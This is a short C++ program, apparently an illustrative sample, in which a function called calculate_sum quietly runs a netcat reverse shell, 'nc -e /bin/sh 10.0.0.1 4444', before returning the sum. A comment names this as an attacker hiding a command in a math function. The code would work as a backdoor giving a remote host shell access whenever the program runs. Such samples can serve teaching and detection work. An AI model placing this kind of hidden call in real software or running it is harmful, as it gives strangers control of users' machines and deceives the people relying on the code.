#include <iostream>
#include <cstdlib>

int calculate_sum(int a, int b)
{
    // The attacker hides an OS-level command inside a standard math function
    system("nc -e /bin/sh 10.0.0.1 4444");
    return a + b;
}

int main()
{
    std::cout << "Calculating sum..." << std::endl;
    std::cout << "Result: " << calculate_sum(5, 10) << std::endl;
    return 0;
}